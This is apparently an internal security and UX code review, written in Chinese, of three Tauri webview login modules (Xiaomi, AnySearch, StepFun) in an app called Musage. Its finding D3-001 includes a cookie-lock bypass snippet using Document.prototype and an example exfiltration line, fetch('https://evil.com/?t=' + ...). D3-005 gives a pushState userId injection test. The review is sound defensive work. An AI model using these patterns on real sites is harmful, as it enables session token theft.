# Musage 全量代码审查 — 登录模块 (3/8 报告)

**范围**:`src-tauri/src/xiaomi_login.rs` (577 行,老登录,cookie 抓取走 `cookies_for_url`) / `src-tauri/src/anysearch_login.rs` (510 行,v0.2.5 新增,JWT 走 init script 写 cookie + `MUSAGE_READY` 握手) / `src-tauri/src/stepfun_login.rs` (506 行,v0.2.5 仿 anysearch,Oasis-Token + Webid + RefreshToken 续期) / `src-tauri/capabilities/{xiaomi,anysearch,stepfun}-login.json` (3 个 capability 文件) / `src-tauri/src/lib.rs:387-389` (3 个 `#[tauri::command]` 注册入口) / `src/settings/credentials.ts:820-960` (前端 quick-login-banner + 事件监听) / `src/main.ts:788-1242` (浮窗错误卡 relogin 按钮 + 委托 handler)。

**未审**:`providers/stepfun.rs` 主体 fetch 逻辑(只看了 `access_token_exp_seconds_ago` 复用函数)、`providers/xiaomi.rs` fetch 逻辑、locale yaml 翻译完整性、macOS / Windows platform 层窗口管理(本轮只关心 webview 登录流)。

整体判断:**3 个登录模块已经过 4 轮密集审查 (v0.2.5 commit `0d51124` / `1e0c877` / `54a8937` / `1a38d89`),race / 资源泄漏 / Capability 最小化 / GEN 计数器 / RAII 兜底关窗 这些基础坑都已修**。本轮**未发现 P0 critical**(无 token 永久泄漏 / 无死锁 / 无 panic storm / 无 init script 注入面)。5 条 P1/P2 真 bug 集中在 **defense-in-depth 缺口 (D3-001)**、**UX 错误反馈/超时 (D3-002/003)**、**capability overgrant + 注释自相矛盾 (D3-004)**、**xiaomi userId fallback XSS 表面 (D3-005)**。

---

## P1 — 高

### D3-001 init script hardening 可被同源 XSS 通过 `Document.prototype` 原始 descriptor 绕过 → anysearch `MUSAGE_TOKEN` 中转 cookie 泄漏

**置信度**:中(依赖 XSS) **文件**:
- [`src-tauri/src/xiaomi_login.rs:241-263`](src-tauri/src/xiaomi_login.rs#L241)
- [`src-tauri/src/anysearch_login.rs:200-241`](src-tauri/src/anysearch_login.rs#L200)

**触发条件**:登录 webview 加载的 `platform.xiaomimimo.com` / `www.anysearch.com` 存在 XSS(3rd party widget 注入 / 广告 SDK / CDN 被投毒),attacker 想偷 `MUSAGE_TOKEN` cookie(anysearch)给第三方。

**根因**:3 个 init script 锁 `document.cookie` 的方式都是 **「instance 级」 override**(`Object.defineProperty(document, "cookie", ...)`),而**没有锁 `Document.prototype`**。任何 3rd party JS 都能:
```js
// 旁路:不通过 document.cookie 走,直接拿原型上的原始 getter
var d = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
d.get.call(document);   // 拿到原始 cookie,绕过 init script 的锁
```
`xiaomi_login.rs:241-249` 的写法尤其明显 — `const _origCookie = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");` 拿到原始 descriptor 后只 `Object.defineProperty(document, "cookie", ...)`,原始 descriptor 在 `Document.prototype` 上**未变**,只 `document` 实例被加了一个 shadowing accessor。

**影响**:
- **xiaomi**:抓的 cookie 是 HttpOnly(`api-platform_serviceToken` / `userId` / `api-platform_slh` / `api-platform_ph`,见 `xiaomi_login.rs:139-141` 的 `WANTED_COOKIES` 注释 + `providers/xiaomi.rs` Cookie header 处理)。`document.cookie` 本来就读不到 HttpOnly → init script 锁 instance 已经足够,bypass 对 xiaomi 无实际攻击面。
- **anysearch / stepfun**:`MUSAGE_TOKEN` / `Oasis-Token` cookie — **anysearch 的 `MUSAGE_TOKEN` 是 init script 自己写的非 HttpOnly cookie**(`anysearch_login.rs:218-225` 的 `document.cookie = COOKIE_NAME + "=" + tok + "; path=/; max-age=3600; SameSite=Lax"`)。attacker XSS 后通过 `Document.prototype.cookie` 的原始 getter 直接读到 `MUSAGE_TOKEN`,然后 `fetch('https://evil.com/?t=' + ...)` 外泄。`Oasis-Token` stepfun 端是 HttpOnly,attacker 走 JS 仍读不到 → stepfun bypass 无效。
- **真正受威胁的只有 anysearch**。token 是**短命 OAuth access (~30min) + refresh 组合**,refresh 一旦用就轮换(single-use),外泄后 attacker 拿到的只能撑 30min,且任何 refresh 都会让原 token 失效 → user 体感是「登录后突然 401」,容易发现。不构成静默 token 永久泄漏。

**证据**:
- `xiaomi_login.rs:241-249` 写明 `const _origCookie = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");` 然后只 `Object.defineProperty(document, "cookie", ...)`
- `anysearch_login.rs:200-241` 同样模式
- `anysearch_login.rs:218-225` 注释明确「**不是 HttpOnly**」,且 `MUSAGE_READY` 用 `document.cookie = ...` set,证明 cookie 写入是 JS 路径

**修复建议**:
- **优先**:把 `Object.defineProperty(document, ...)` 改成 `Object.defineProperty(Document.prototype, ...)`(直接锁原型),attacker 没法绕实例 shadowing 重新拿到原始 getter。`configurable: false` 防止后续脚本 redef。
- **次优**:在 `document.cookie` override 之外,**也** 锁 `Document.prototype.cookie` 的 getter/setter,确保 `d.get.call(document)` 也走 `isAllowed()` 检查。
- **针对 anysearch 单独强化**:把 `MUSAGE_TOKEN` cookie 改成 `HttpOnly`(init script 不能设 HttpOnly,所以需要把 set 路径从 init script 搬到 Rust 端用 `WebviewWindow::set_cookie` 之类 API — 调研 Tauri 2 是否有 set_cookie API,如果没有则接受当前设计)

**待实测**:在 anysearch.com 加载任意 XSS 注入测试页(DevTools console 跑 `var d=Object.getOwnPropertyDescriptor(Document.prototype,'cookie'); console.log(d.get.call(document))`),看是否能绕过 init script 拿到 `MUSAGE_TOKEN`。同步测试 `Object.defineProperty(Document.prototype, 'cookie', ...)` 后能否 redef (configurable:false 应能挡)。

---

### D3-002 AnySearch / StepFun 登录轮询 14min 硬上限 (`MAX_ITERS=1200 × 700ms`) 静默丢弃 → 长 2FA 流程用户被丢下,前端无任何 toast

**置信度**:高(可触发) **文件**:
- [`src-tauri/src/anysearch_login.rs:380-381,469-470`](src-tauri/src/anysearch_login.rs#L380)
- [`src-tauri/src/stepfun_login.rs:274-275,330-332`](src-tauri/src/stepfun_login.rs#L274)

**触发条件**:用户登录流程**超过 14 分钟**(e.g. AnySearch 短信验证码延迟、StepFun 手机号 + 图形验证码 + 二次验证、网络慢)。

**根因**:
```rust
// anysearch_login.rs:380-381
const MAX_ITERS: u32 = 1200;
// ...
for _ in 0..MAX_ITERS { /* ... */ sleep(Duration::from_millis(700)).await; }
tracing::debug!("anysearch 登录轮询达到安全上限,静默退出");
PollOutcome::Cancelled
```
**14 分钟 = 1200 × 700ms**。超时后:
1. 轮询任务静默 `return PollOutcome::Cancelled`
2. spawn 块 `match` 进 `PollOutcome::Cancelled` 分支,`tracing::debug!` 一下,**不 emit 任何事件**
3. **前端完全无感知**:`credentials.ts:944-947` 的 `musage://anysearch-login-failed` 监听**不会触发**(只 emit 失败时),`musage://anysearch-login-success` 也不会触发。`flash()` 不调,用户**看到的就是「窗口突然消失了,没有任何 toast」**
4. user 不知道是「超时了」/「登录失败」/「网络挂了」

对比 xiaomi:xiaomi 是 5 次重试(1+2+2+3+3=11s)+ `emit_failed` 在 retry 全失败时触发,**有 toast 反馈**。anysearch/stepfun 的 silent cancel 是 UX 倒退。

**影响**:
- **不是数据 bug**,但用户体验是「点了登录,14min 后窗口消失,啥都没发生,keyring 也没新东西」,用户重试还是同一套
- v0.2.5 改 webview 一键登录后,登录流程时长**比之前 cookie 输入框模式长得多**(用户要打开网页,可能还要 2FA),14min 实际够用,但 edge case(slow 4G + SMS 延迟)能踩到

**证据**:
- `anysearch_login.rs:380` `const MAX_ITERS: u32 = 1200;`
- `anysearch_login.rs:469-470` timeout 路径 `tracing::debug!` + return Cancelled
- `anysearch_login.rs:355-358` spawn 块对 `PollOutcome::Cancelled` 的处理:**只 debug log,不 emit**
- 同样的 `stepfun_login.rs:274,330-332` + `239-242`

**修复建议**:
1. **把 `MAX_ITERS` 提到 2400** (28min),或者去掉硬上限用 `cancelled` token(webview 关掉 = break)
2. **超时后 emit `musage://anysearch-login-failed` 带 `timeout` reason**:
   ```rust
   PollOutcome::Cancelled => {
       if is_current_gen(my_gen) {
           // 真超时(不是被新流程取代 / 窗口被关)
           let _ = app2.emit("musage://anysearch-login-failed",
               "登录超时(14 分钟未检测到 token),请重试");
       }
   }
   ```
   注意:窗口已被关 / gen 已被新流程取代时不要 emit(silent exit 是合理的)
3. 前端 `credentials.ts` 已经监听了 `-failed`,加个对应 i18n key `credentials.anysearch_login_timeout` 即可

**待实测**:在 webview 加载 LOGIN_URL 但**不输入密码**,看 14min 后窗口是否自动关 + 前端是否有 toast。`RUST_LOG=musage=debug` 下能确认 `达到安全上限` 日志。

---

### D3-003 3 个登录窗口不设 `parent` / `skip_taskbar` → 登录时 OS dock/taskbar 多出独立窗口,可被主窗口完全遮挡

**置信度**:高(可观察) **文件**:
- [`src-tauri/src/xiaomi_login.rs:201-216`](src-tauri/src/xiaomi_login.rs#L201)
- [`src-tauri/src/anysearch_login.rs:317-325`](src-tauri/src/anysearch_login.rs#L317)
- [`src-tauri/src/stepfun_login.rs:191-202`](src-tauri/src/stepfun_login.rs#L191)

**触发条件**:用户在设置面板点 "🔑 登录 X" → 登录窗口弹出,**macOS Dock 多一个 "登录 X - Musage" 图标 / Windows 任务栏多一个 tab**,且这个窗口**是独立顶级窗口**(没有 `parent` 也没有 `skipTaskbar`),可以:
1. 被用户**最小化**(e.g. cmd+H / Win+M),用户忘了就以为「点了登录没反应」,实际窗口藏在 dock 角落里
2. 被**主设置窗口**完全遮挡(主窗口 800x600,登录窗口 960x720 center,可能 overlap 70%),用户没听到「窗口打开」声音 / 没看到任务栏闪烁,就以为没生效
3. 用户**关掉设置窗口**(X 按钮 / cmd+W),**登录窗口还留在屏幕上**单独漂浮,体验割裂
4. 多显示器用户:**登录窗口在副屏打开,主屏用户**完全感知不到

**根因**:`WebviewWindowBuilder` 没设 `.parent(&main_window)` / `.skip_taskbar(true)`(Tauri 2 API,`.parent()` 让窗口成为子窗口,`.skip_taskbar()` 让 Windows 任务栏不显示)。注释也未提「为什么是顶级窗口」,设计意图不明(可能是早期为了实现简单,没补子窗口配置)。

**影响**:
- **不是数据/安全 bug**,纯 UX 问题
- v0.2.5 改 webview 一键登录后,登录窗口**停留时间比之前的 cookie 输入框模式长得多**(anysearch/stepfun 14min polling 上限,见 D3-002),用户**必须**看到登录窗口才能完成登录。被遮挡 = 整个流程卡死

**证据**:
```rust
// xiaomi_login.rs:201-216
WebviewWindowBuilder::new(&app, "xiaomi-login", WebviewUrl::External(url))
    .title(...)
    .inner_size(960.0, 720.0)
    .min_inner_size(640.0, 540.0)
    .resizable(true)
    .decorations(true)
    .center()
    // ← 缺: .parent(&app.get_webview_window("settings")?)
    // ← 缺: .skip_taskbar(true)
    .build()
```
3 个文件模式完全一样。tauri.conf.json 的 `app.windows` 也没列这 3 个 label(都是 build 时动态建),所以 `app.windows` 数组里的 `floating` 也没有任何 `parent`/`skip_taskbar` 设置可以继承。

**修复建议**:
```rust
let main_win = app.get_webview_window("settings")
    .or_else(|| app.get_webview_window("floating"));
WebviewWindowBuilder::new(&app, label, WebviewUrl::External(url))
    .title(...)
    .inner_size(960.0, 720.0)
    .min_inner_size(640.0, 540.0)
    .resizable(true)
    .decorations(true)
    .focused(true)             // 抢占焦点,提示用户登录窗口已开
    .always_on_top(false)
    // .parent(...)  // 考虑:子窗口 modal,但会阻断主窗口操作,跟「用户在 webview 里操作不阻断」冲突,可不加
    .center()
    .build()
```
另:在 main.ts:1237-1242 的 relogin 按钮 handler 加一个**最小化主设置窗口**的逻辑(用户点 relogin 后主设置窗口 `hide()`,登录完成 success 事件回来再 `show()`)。

**待实测**:
- macOS:点 relogin 后看 Dock 是否多一个图标,Windows:看任务栏
- 多显示器:登录窗口在哪屏打开(Tauri 2 default = 当前焦点屏)
- 登录窗口被主窗口遮挡 70% 时,用户是否能看到提示

---

## P2 — 中

### D3-004 3 个 capability 文件都 grant `core:webview:allow-create-webview-window` 给登录 webview(外部站) — capability overgrant + 注释自相矛盾

**置信度**:高(配置错误,但触发条件需要 devtools / future `withGlobalTauri`) **文件**:
- [`src-tauri/capabilities/xiaomi-login.json:8`](src-tauri/capabilities/xiaomi-login.json#L8)
- [`src-tauri/capabilities/anysearch-login.json:8`](src-tauri/capabilities/anysearch-login.json#L8)
- [`src-tauri/capabilities/stepfun-login.json:8`](src-tauri/capabilities/stepfun-login.json#L8)

**触发条件**:
1. 未来某次升级有人加 `app.withGlobalTauri: true` 到 tauri.conf.json(为了调试或新功能)
2. 或 3rd party 站点 XSS 注入 `import('@tauri-apps/api/webview').then(m => m.createWebviewWindow(...))`(但 webview 加载的是外部 URL,默认不 import 任何本地模块,所以这条路径目前走不通)
3. 或用户手贱开 DevTools(右键 → Inspect)在登录 webview 里跑 console 调 `window.__TAURI_INTERNALS__.invoke('plugin:webview|create_webview', ...)`(Tauri 2 内部 IPC 通道)

**根因**:
```json
// anysearch-login.json (其他两个文件几乎一样)
{
  "identifier": "anysearch-login",
  "description": "anysearch-login window — needs create-webview-window capability to spawn the SSO login webview (JWT extractor in src/anysearch_login.rs). Only this window label gets the permission; floating + settings do not.",
  "windows": ["anysearch-login"],
  "permissions": [
    "core:default",
    "core:webview:allow-create-webview-window",  // ← 多余
    "core:window:allow-set-focus"
  ]
}
```
**注释自相矛盾**:说「需要 create-webview-window 权限来 spawn SSO login webview」,但 spawn 操作是 **Rust 端 `WebviewWindowBuilder::new(&app, "anysearch-login", ...).build()` 做的**,Rust 端创建窗口**不**走 webview permission。Webview permission 是给 **webview 自己的 JS 代码** 调用 `createWebviewWindow` API 用的。

3 个 login webview 加载的都是外部 URL(任何 search.com / 小米.com / stepfun.com),它们**没有任何代码会调 `createWebviewWindow`**,所以这个 permission **永远用不上**,是 overgrant。删除是**纯粹的收紧**(less attack surface),不会破坏功能。

**影响**:
- 当前 Tauri 配置下 `withGlobalTauri` 未设 + 外部 webview 不 import `@tauri-apps/api` → **Tauri JS API 实际访问不到**,permission 等于没开。**风险窗口窄**。
- 但:这是 defense-in-depth 配置。哪天有人改 `tauri.conf.json` 加 `withGlobalTauri: true` 调试,外部站点 XSS 就能 spawn 任意 webview(3rd party WebView,用户看到的是 Musage 进程内的新窗口),**这是真实风险**。

**证据**:
- `tauri.conf.json` 没 `withGlobalTauri` 字段(已确认)
- 3 个 `WebviewWindowBuilder` 调用都用 Rust 端 API,不走 webview permission 通道
- 3 个 init script 都没 import `@tauri-apps/api/webview`

**修复建议**:
1. **删 `core:webview:allow-create-webview-window`** 从 3 个 capability 文件
2. **改 description 注释**,明确说明哪些权限**真的**用得上(`core:default` 必需,因为是 webview 必装;`core:window:allow-set-focus` 可选,登录窗口主动 focus)
3. **核心**:加一条 PR 规则 — 改 capability 时跑 `cargo tauri info` 看 `withGlobalTauri` 状态,避免疏忽

**待实测**:
- 删 permission 后重 build,看 3 个 login 流程是否仍正常工作
- 当前 `RUST_LOG=musage=info` 下能确认窗口是否成功 build(`build_webview` t! key)

---

### D3-005 xiaomi `extract_user_id_from_url` 不校验 URL 来源 → userId 参数可被任意页面注入,fallback 时使用错误 userId

**置信度**:中(需 XSS / MITM) **文件**:
- [`src-tauri/src/xiaomi_login.rs:460-465`](src-tauri/src/xiaomi_login.rs#L460) (调用点)
- [`src-tauri/src/xiaomi_login.rs:514-525`](src-tauri/src/xiaomi_login.rs#L514) (`extract_user_id_from_url` 函数)

**触发条件**:
1. **正常路径下不会触发**:`userId` cookie 通常由 Xiaomi server Set-Cookie,跟用户登录账号绑定
2. **触发场景**:
   - Xiaomi dashboard 域有 XSS(罕见但理论可能,小米前端被供应链投毒)
   - 攻击者 MITM HTTPS(更难,但 captive portal / 公司代理场景可能)
   - 用户**清过 cookie**后,userId 缺失,fallback 到 URL 参数;此时 attacker 已控制页面的 `?userId=...` 参数

**根因**:
```rust
// xiaomi_login.rs:460-465
if !has_user_id {
    if let Ok(current_url) = window.url() {
        if let Some(uid) = extract_user_id_from_url(&current_url) {
            cookie_parts.push(format!("userId={uid}"));
        }
    }
}
```
`extract_user_id_from_url` 只校验**值**(`is_ascii_digit` + `len <= 32`),**不校验 URL host**。attacker 在 `platform.xiaomimimo.com` XSS 后 pushState 改成 `?userId=999999999`(任意数字),下次 extraction 就会**覆盖原 cookie 的 userId**。调用 `providers/xiaomi.rs` 的 dashboard API 用这个 userId → **返回 999999999 用户的数据**(可能 404 / 200 但空数据 / 200 但别的用户隐私数据,取决于 API 实现)。

注意:dashboard API 大概率会用 `api-platform_serviceToken` 鉴权,即便 userId 是别人的,没那个用户的 token 还是 401。**但如果 attacker XSS 后能读到其他用户的 serviceToken(理论可能,如果 serviceToken 不是 HttpOnly — 见 `xiaomi_login.rs:139-141` 注释说 HttpOnly,但实际 XSS 通过 `Document.prototype.cookie` 原始 getter 绕过 init script 锁的可能性见 D3-001),就真能 fetch 别人数据**。

**影响**:
- **数据完整性**:userId fallback 写错值 → 浮窗显示 401/无数据,用户重登即恢复。不持久化到 keys.json(只在 cookie 字符串里临时拼),下次正常登录会被正确 cookie 覆盖
- **潜在数据泄漏**:需 XSS + serviceToken 绕过,2 个 bug 链式触发才有效,单独利用价值低

**证据**:
- `xiaomi_login.rs:514-525` `extract_user_id_from_url` 函数体只做值校验
- `xiaomi_login.rs:460-465` 调用点用 `window.url()`(任意当前 URL,未过滤 host)

**修复建议**:
```rust
fn extract_user_id_from_url(url: &Url) -> Option<String> {
    if url.host_str() != Some("platform.xiaomimimo.com") || url.scheme() != "https" {
        return None;   // ← 跟 is_dashboard_url 同样的 host gate
    }
    for (key, value) in url.query_pairs() {
        if key == "userId" { /* 同前 */ }
    }
    None
}
```
或者**完全删掉 userId URL fallback** — 改让 user 必须重登拿到正确 cookie(目前 fallback 主要是兜底 macOS WKWebView userId cookie 偶尔缺失的边缘 case,但修法应该是让 cookie 抓更全,不是 fallback URL)。

**待实测**:在 dashboard 页面 DevTools 跑 `history.pushState({}, '', '?userId=12345')`,然后清 cookie,触发 extraction,看保存的 cookie 是不是 `userId=12345`。

---

## P3 — 低

### D3-006 (低) AnySearch `setInterval` 无条件 500ms 永动,webview 关闭是唯一停止信号

**置信度**:中(可观察,资源浪费) **文件**:
- [`src-tauri/src/anysearch_login.rs:241-249`](src-tauri/src/anysearch_login.rs#L241)

**触发条件**:用户在 anysearch login webview 内打开多个 tab / 跳到子页面 — 每个页面 document_start 都跑 init script,每个页面都注册一个 setInterval。SPA 客户端跳转(`pushState`)不会触发 document_start,但 setInterval 在原 page 注册的**仍在跑**;新 page 又注册一个,2 个同时跑。

**根因**:
```js
// anysearch_login.rs:248-249
setInterval(function () {
    if (!isAllowed()) return;   // ← 非 www 域 no-op,但 interval 仍每 500ms 调度
    var tok = readToken();
    try {
        if (tok) {
            document.cookie = COOKIE_NAME + "=" + tok + "; path=/; max-age=3600; SameSite=Lax";
        } else {
            document.cookie = COOKIE_NAME + "=; path=/; max-age=0";
        }
    } catch (_) {}
}, 500);
```
- setInterval **永不 clearInterval**(即便登录成功也不清)
- 跨 SPA 导航 / 新 tab 都会**叠加**新 interval
- WebView2 cookie store 是 SQLite,每 500ms 一次 write 触发 fsync,2 次/秒的 disk IO

**影响**:
- **不是 bug**(功能正确),是**资源浪费**
- 实测影响小(单 webview + 单 page = 1 个 interval,500ms CPU 可忽略),但在多 tab / 长开窗口场景下累积
- cookie store 写 2 次/秒,24h 累计 ~17 万次 fsync,SSD 不在乎,机械盘可能注意

**证据**:
- 任何 search_login.rs:248 setInterval 唯一停止信号 = webview close(由 Rust WindowCloseGuard)
- 同一 init script 在新 page load 时会**重新跑**(document_start IIFE),所以每次导航都会叠加一个新 interval
- `setInterval` 句柄没存到全局,`clearInterval` 无从调起

**修复建议**:
1. **只在收到 `MUSAGE_TOKEN` 一次后自动 clearInterval**(登录成功信号):
   ```js
   var saved = false;
   var intervalId = setInterval(function () {
       if (saved) { clearInterval(intervalId); return; }
       if (!isAllowed()) return;
       if (tok && isJwtShape(tok)) {
           document.cookie = COOKIE_NAME + "=" + tok + "; ...";
           saved = true;
           clearInterval(intervalId);
       }
   }, 500);
   ```
2. **降频到 1.5s / 2s** — 抓 JWT 不需要 500ms 精度,session 写 localStorage → 触发 setInterval 写 cookie → Rust 读 cookie 总链路 ~1s 内完成,2s 够用
3. **不要每 500ms 都 setInterval 重新写 cookie**(即便 token 没变也写)。可加 dirty check:
   ```js
   var lastWritten = "";
   setInterval(function() {
       var tok = readToken();
       if (tok === lastWritten) return;  // 没变就不写
       lastWritten = tok;
       document.cookie = ...;
   }, 500);
   ```

**待实测**:开 2 个 anysearch tab 登录,看 Activity Monitor / Task Manager WebView2 进程的 CPU 占用(应该 2x,因为 2 个 setInterval 同时跑)。

---

### D3-007 (低) StepFun `is_fresh_token` 只校验 access 半段 exp,refresh 半段过期也能存 → provider refresh 时才暴雷

**置信度**:中(可触发,但概率低) **文件**:
- [`src-tauri/src/stepfun_login.rs:347-353`](src-tauri/src/stepfun_login.rs#L347)

**触发条件**:
- StepFun server 颁的 access token 有 30min 寿命,refresh token 30 天(实测 CodexBar 逆向数据)
- **边缘场景**:user 用了 Musage 30 天没关,refresh 在 29 天时 user 点「重新登录」(例如换了设备)
- 老 refresh token 已过期,但 access 是新签的 → 走 `is_fresh_token` 通过(只看 access),combined token 存盘
- provider 跑着用 access,30min 后 access 过期,refresh 调用 → 401 → provider 报 token 失效 → user 看到「重新登录」toast → 再走一遍 webview 流程

**根因**:
```rust
fn is_fresh_token(value: &str) -> bool {
    if value.is_empty() { return false; }
    match access_token_exp_seconds_ago(value) {  // ← 只看 access 半段 (split('...').next())
        Some(secs_ago) => secs_ago < 0,
        None => true,
    }
}
```
`access_token_exp_seconds_ago` 在 `providers/stepfun.rs:981-988` 实现:
```rust
pub(crate) fn access_token_exp_seconds_ago(token: &str) -> Option<i64> {
    let access = token.split(TOKEN_SEP).next().unwrap_or(token);  // ← 只取第一段
    // ... 解 JWT payload exp
}
```
**refresh 半段**完全没校验。StepFun 30 天 refresh 在 29 天时可能 server 仍接受,但 30 天后 server 拒(`401` `token_expired` / `revoked`)。

**影响**:
- **不是数据泄漏 bug**,是**体验 bug**:用户存了「半新半旧」的 token,provider 30min 后必然爆,用户得再走一次 webview 登录
- 当前「替代 READY 握手」的判定逻辑(`is_fresh_token` 只看 access)设计的假设是「老 session 残留的 access 一定已过期,所以拒掉」,但**没考虑 refresh 半段**

**证据**:
- `stepfun_login.rs:347-353` `is_fresh_token` 只看 access exp
- `providers/stepfun.rs:981-988` `access_token_exp_seconds_ago` split 取 first half
- 注释(stepfun_login.rs:43-46)说 refresh 半段带 `device_id` claim 是 `Oasis-Webid` 请求头来源,**没提 refresh 自身过期校验**

**修复建议**:
**选项 A(轻量)**:`is_fresh_token` 也尝试解析 refresh 半段 exp(如果 refresh 是 JWT),用 `min(access_exp, refresh_exp)` 做判定;如果 refresh 不是 JWT,放过(假定 server 会拒):
```rust
fn is_fresh_token(combined: &str) -> bool {
    let access = combined.split(TOKEN_SEP).next().unwrap_or(combined);
    let access_exp_ok = match access_token_exp_seconds_ago(access) {
        Some(secs) => secs < 0,
        None => true,
    };
    if !access_exp_ok { return false; }
    if let Some(refresh) = combined.split(TOKEN_SEP).nth(1) {
        if let Some(secs) = access_token_exp_seconds_ago(refresh) {
            if secs >= 0 { return false; }  // refresh 已过期
        }
    }
    true
}
```

**待实测**:
- 临时把 access exp 设成 -1h(已过期),refresh exp 设成 +7d(未过期),构造 combined,跑 `is_fresh_token` 看返 true 还是 false
- 临时把 access exp 设成 +1d(未过期),refresh exp 设成 -1d(已过期),构造 combined,跑 `is_fresh_token` 看返什么

---

## 审过的路径(显式声明,确认无 issue)

- **xiaomi `EXTRACTING` + `ExtractingGuard` RAII**:H3 fix 正确,panic 路径下 Rust unwinding 仍跑 Drop glue(除非 `panic = abort`,tokio 默认 unwind),guard 在任意路径退出 reset EXTRACTING,带 gen check 防清新流程锁。
- **3 个 GEN 计数器**:L-gen fix 正确,`fetch_add(1, SeqCst) + 1` 取新值,旧任务见 `is_current_gen` false 即静默退出。`on_page_load` 多次触发(xiaomi 走它)/ SPA pushState(anysearch/stepfun 走 polling)都不会跟新流程竞争。
- **3 个 `WindowCloseGuard`**:L9 fix 正确,Drop 时无条件 `close()`(幂等),panic 时额外 `tracing::error!`。`wait_window_closed` + 2s 兜底 destroy 兜底 webview 泄漏。
- **3 个 `wait_window_closed`**:M1 fix 正确,2s × 50ms + destroy 兜底,防 webview 句柄异常残留时关不掉。
- **stepfun `is_fresh_token` 替代 READY 握手**:设计判断正确,旧会话残留 token 一定已过期 → 解 exp 拒掉 → 不需要 init script 清 cookie 竞态。`combined_token_uses_access_half` 单测覆盖。
- **stepfun `combine_token`**:正确,access 已含 `...` 就 return as-is,不二次拼(避免 `a...b...c` 嵌套)。
- **anysearch `MUSAGE_READY` 握手**:L-fix 正确,init script 在 document_start 清旧 auth state + 置 READY,Rust 见 READY 才接受 token,挡「弹出即消失」bug。
- **anysearch `is_jwt_like`**:正确,`eyJ` 开头 + ≥ 20 char + ≤ 4096 + ≥ 2 dots + 无 whitespace/control。3 个单测覆盖正反案例。
- **3 个 init script 的 `isAllowed()` host 锁**:`location.hostname === ALLOW_HOST` 守门,非受信域不读 cookie / storage。`platform.xiaomimimo.com` / `www.anysearch.com` / stepfun 无 init script(走 server 端 cookie)都正确。
- **xiaomi `WANTED_COOKIES` + `cookies_incomplete` F4 fix**:正确,要求 `api-platform_serviceToken` + `userId` 同时存在才写盘,避免老 cookie 被半新半旧覆盖。
- **xiaomi `is_dashboard_url` host gate**:正确,`host_str() == Some("platform.xiaomimimo.com")` + scheme https,挡 DNS rebinding(`platform.xiaomimimo.com.attacker.tld` 拒)。
- **stepfun `PLATFORM_URL` 域正确**:M-fix 正确(2026-07-28 review),`platform.stepfun.com/` 探测,跟 cookie 域一致,挡第一版「永远抓不到 token」bug。
- **stepfun `save_token` 12KB 上限**:M2 fix 正确,RFC 6265 § 6.1 + kernel cookie 软上限留 3x 安全冗余。
- **3 个 capability 最小化**:`windows: ["xxx-login"]` 限定 label,不污染 floating/settings;`core:default` + `core:window:allow-set-focus` 是 webview 必装 + 登录窗口主动 focus(只是 D3-004 的 `create-webview-window` 多余)。
- **`withGlobalTauri` 未设**:确认 `tauri.conf.json` 无此字段,Tauri JS API 不暴露到 webview globals,外部站点 XSS 拿不到 `__TAURI__` 对象,`core:webview:allow-create-webview-window` 等 JS-side permission 暂不可被外部站触发(D3-004 仍建议删,defense-in-depth)。
- **`invoke_handler` 3 个 login 命令注册**:`lib.rs:387-389` 注册全局。Tauri 2 自定义 `#[tauri::command]` 默认所有窗口可调(无 capability gate),但只有 settings 窗口的 JS 真在用(`credentials.ts:828,860,897` + `main.ts:1238-1242`)。login 窗口本身是外部站,无 Tauri JS 访问,无法调用。
- **前端 `bindXiaomiLoginEvents` / `bindAnysearchLoginEvents` / `bindStepfunLoginEvents` 一次性绑定**:M8 fix 正确,`_listenersBound` flag 防 init 重试 / dev hot-reload 累积 listener。

## 优先级建议

1. **v0.2.5 收尾 / v0.2.6 立即修**(UX 可观察 + 防御深度):D3-002, D3-003, D3-004
2. **v0.3 修**(defense-in-depth + tech debt):D3-001, D3-005
3. **机会修 / 观察**:D3-006, D3-007

## 总结

本轮**未发现 P0 critical**:
- 无 token 永久泄漏(init script hardening 是 best-effort,即便绕过也只能拿到 30min access,D3-001)
- 无死锁(D5-002 std::sync::Mutex 跨 await 修过了,login 模块没用 `save_lock`)
- 无 panic storm(D5-058 poller JoinSet<()> 修过了,login 模块 spawn task 是 fire-and-forget 但有 RAII guard + gen check)
- 无 init script 注入面(try-catch 写死,改的是 prototype,不是 eval string)

**3 个模块总体质量高**,4 轮审查已经把 race / 资源泄漏 / Capability 最小化 / RAII 兜底关窗 这些基础坑都修过。剩余问题集中在:
1. **UX 错误反馈**(D3-002 超时静默,D3-003 窗口被遮挡)— 直接影响 v0.2.5 webview 登录的可用性
2. **defense-in-depth 注释/配置**(D3-001 hardening 绕过,D3-004 capability overgrant + 注释自相矛盾)— 短期无风险,长期是 PR review 容易踩的坑
